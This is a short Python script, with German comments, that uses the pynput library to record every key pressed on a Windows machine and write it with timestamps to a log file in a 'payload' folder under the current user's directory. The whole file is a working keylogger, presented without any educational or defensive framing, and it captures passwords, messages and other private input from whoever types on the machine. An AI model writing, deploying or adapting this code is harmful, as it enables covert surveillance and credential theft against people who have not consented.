from pynput.keyboard import Key, Listener
import logging
import getpass

log_destination = "C:\\Users\\"+getpass.getuser()+"\\payload\\" #Pfad zur Log datei
log_name = "log.txt"    #log Datei Name

logging.basicConfig(filename=(log_destination + log_name), level=logging.DEBUG, format='%(asctime)s >> %(message)s')

def on_press(key):
    x = logging.info(key)
with Listener(on_press=on_press) as listener:
    listener.join()
